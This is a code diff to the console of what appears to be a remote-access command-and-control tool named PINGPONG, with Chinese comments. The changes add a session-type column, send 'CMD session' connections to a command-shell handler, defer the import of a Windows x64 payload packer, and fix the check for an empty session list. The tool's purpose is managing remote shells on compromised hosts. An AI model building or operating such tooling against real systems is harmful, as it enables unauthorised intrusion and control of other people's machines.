@@ -6,8 +6,6 @@ import handler
 import config_set
 import threading
 import sys
-sys.path.append('./payload')
-import payload_packer
 #print的基本函数
 #PINPONG 攻击载荷文件夹：payload/PINGPONG_payload_file
 def print_error(str):
@@ -45,6 +43,8 @@ def sub_main():
         if choice == "1":
             startserver()
         elif choice == "2":
+            sys.path.append('./payload')
+            import payload_packer
             def payload_choice():
                 print_normal("type of payload:")
                 print_normal("1) PINGPONG windows x64")
@@ -187,12 +187,12 @@ def sub_main():
                 id_list = [i for i in range(1, number_of_sessions + 1)]
                 print_normal('''
     sessions>[*]All the sessions: 
-    id   -------------------info-------------------
+    id   ----type----    -------------------info-------------------
                 ''')
                 for i in id_list:
                     session = session_pool[i - 1]
                     print_normal(f'''
-    {i}    {session[1]} : {session[2]} ---> {session[3]} : {session[4]}         ''')
+    {i}  {session[5]}  {session[1]} : {session[2]} ---> {session[3]} : {session[4]}         ''')
                 try:
                     input_id = int(input("sessions>[*]type the id of the session(type 'back' for main console)>"))
                 except:
@@ -201,7 +201,13 @@ def sub_main():
                 back_to_main(input_id)
                 session = session_pool[input_id - 1]
                 session[0].send(bytes('OK', 'utf8'))
-                handler.PINGPONG_shell(session[0], session[1], session[2], session[3], session[4], False, '')
+                if session[5] == 'PINGPONG session':
+                    handler.PINGPONG_shell(session[0], session[1], session[2], session[3], session[4], False, '')
+                elif session[5] == 'CMD session':
+                    import PINGPONG_script.cmdshell
+                    # [cmd_SessObj, ip, cmd_port, _ip, _port, 'CMD session']
+                    # (cmd_SessObj, ip, cmd_port, _ip, _port, main_port, conn, cmd_session)
+                    PINGPONG_script.cmdshell.cmd_shell(session[0], session[1], session[2], session[3], session[4], ' ', None, None)
             back_to_sessions()
         elif choice == '5' or choice == 'help' or choice == 'HELP':
             print_good(""" 
@@ -270,7 +276,7 @@ def main():
     print_normal("2) Make payload(s)")
     print_normal("3) Settings")
     session_pool = config_set.load_config_for_main_py('connect_pool')
-    if session_pool == None:
+    if session_pool == None or session_pool == []:
         print_normal("4) Help")
     else:
         print_normal("4) Session(s)")
